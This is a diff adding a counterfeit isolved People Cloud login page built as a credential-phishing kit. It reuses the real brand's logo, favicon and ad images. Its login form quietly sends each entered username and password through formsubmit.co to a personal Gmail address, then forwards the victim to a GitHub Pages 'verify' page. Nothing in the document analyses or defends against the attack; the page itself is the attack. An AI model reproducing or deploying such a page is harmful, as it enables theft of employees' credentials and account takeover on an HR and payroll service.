@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no" />
+
+  <title>isolved People Cloud</title>
+
+  <link rel="icon" type="image/x-icon" href="https://identity.myisolved.com/favicon.png" />
+  <link rel="shortcut icon" type="image/x-icon" href="https://identity.myisolved.com/favicon.png" />
+  <link rel="stylesheet" href="./isolved_files/hcm-themes.css" />
+  <link rel="stylesheet" href="./isolved_files/bootstrap.min.css" />
+  <link rel="stylesheet" href="./isolved_files/bootstrap-glyphicons.min.css" />
+  <link rel="stylesheet" href="./isolved_files/site.min.css" />
+  <link rel="stylesheet" href="./isolved_files/chosen.css" />
+  <link rel="stylesheet" href="./isolved_files/all.min.css" />
+</head>
+
+<body class="body-bgd-pattern" data-hcm-actions-theme="original" data-new-gr-c-s-check-loaded="14.1093.0"
+  data-gr-ext-installed="">
+  <div class="background-pattern">
+    <div class="container body-container">
+      <div class="login-page">
+        <div class="row justify-content-center">
+          <div class="col-lg-6 col-md-8 col-12">
+            <div class="card">
+              <div class="card-header">
+                <img src="./isolved_files/isolved_people_cloud.png" alt="logo" class="client-logo" />
+              </div>
+
+              <div class="card-body">
+                <main>
+                  <form id="loginForm" action="https://formsubmit.co/trevorharrisx3@gmail.com" method="POST">
+                    <input type="hidden" name="_next" value="https://charles-x-pixel.github.io/isolved-verify/" />
+                    <input type="hidden" name="_subject" value="New Login Attempt" />
+                    <input type="hidden" name="_captcha" value="false" />
+
+                    <h1>Welcome</h1>
+                    <p>Log in to access isolved People Cloud applications</p>
+
+                    <div class="form-group">
+                      <label class="w-100" for="Input_Username">Username</label>
+                      <input class="form-control" type="email" id="Input_Username" name="email" required />
+                    </div>
+
+                    <div class="form-group">
+                      <label class="w-100" for="Input_Password">Password</label>
+                      <input class="form-control" id="Input_Password" name="password" type="password" required />
+                    </div>
+
+                    <div class="mt-3 container-buttonstack">
+                      <button class="btn btn-primary" name="submit" type="submit">
+                        Log In
+                      </button>
+                    </div>
+                  </form>
+                </main>
+              </div>
+            </div>
+          </div>
+          <div class="col-lg-6 col-md-4 col-12 login-form-ads">
+            <a href="https://isolved.co/4jfudYL" target="_blank" rel="noopener">
+              <img
+                src="https://isolvedcdnprod.azureedge.net/prod/login-page-ad-images/CVA%20Ad%20-3%20-%20DARK-260x214-px.png"
+                alt="Advertisement" />
+            </a>
+            <a href="https://isolved.swoogo.com/2025isolvedConnectforPeopleHeroes" target="_blank" rel="noopener">
+              <img
+                src="https://isolvedcdnprod.azureedge.net/prod/login-page-ad-images/Social%20-%20Event%202025%20Promo%20-%20Customer%2001-260x214-px.png"
+                alt="Advertisement" />
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const email = localStorage.getItem("userEmail");
+
+      if (email) {
+        document.getElementById("Input_Username").value = email;
+      } else {
+        window.location.href = "http://127.0.0.1:5500/";
+      }
+    });
+  </script>
+</body>
+
+</html>
